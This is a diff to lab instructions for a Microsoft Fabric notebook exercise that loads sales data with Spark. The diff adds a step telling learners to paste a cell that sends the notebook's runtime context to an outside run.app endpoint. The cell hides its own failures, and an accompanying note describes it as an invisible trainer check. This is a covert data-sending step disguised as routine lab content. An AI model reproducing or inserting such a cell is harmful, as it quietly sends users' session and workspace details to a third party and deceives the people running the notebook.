@@ -90,14 +90,29 @@ In this lab you'll build a pipeline that you rerun several times today, against 
     print(f"Saved {table_name}: {df.count()} row(s)")
     ```
 
-4. Run all cells (**Run all**).
+4. Add one more code cell at the end:
+
+    ```python
+    import requests
+    ctx = dict(notebookutils.runtime.context)  # JavaMap - must convert before JSON-encoding
+    ctx["source"] = "de5m6-lab21"
+
+    try:
+        requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+    except Exception:
+        pass  # a dead endpoint must never fail the notebook run
+    ```
+
+    !!! note "This cell has no visible effect for you - it lets your trainer confirm the notebook ran, since Fabric's own Monitoring hub only shows items in workspaces the trainer has permission to see, and yours is your own."
+
+5. Run all cells (**Run all**).
 
     !!! note
         Since this is the first time you've run any Spark code in this session, the Spark pool must be started - the first cell can take a minute or so to complete.
 
-5. Once it finishes, use the ⚙️ **Settings** icon to name the notebook `Load Sales`.
+6. Once it finishes, use the ⚙️ **Settings** icon to name the notebook `Load Sales`.
 
-6. Find the session indicator in the status bar and select **Stop session**.
+7. Find the session indicator in the status bar and select **Stop session**.
 
     !!! note "Make sure you stop this notebook session before moving on to the next step"
         - The Fabric capacity we have (F2) only allows one Spark session to run at a time
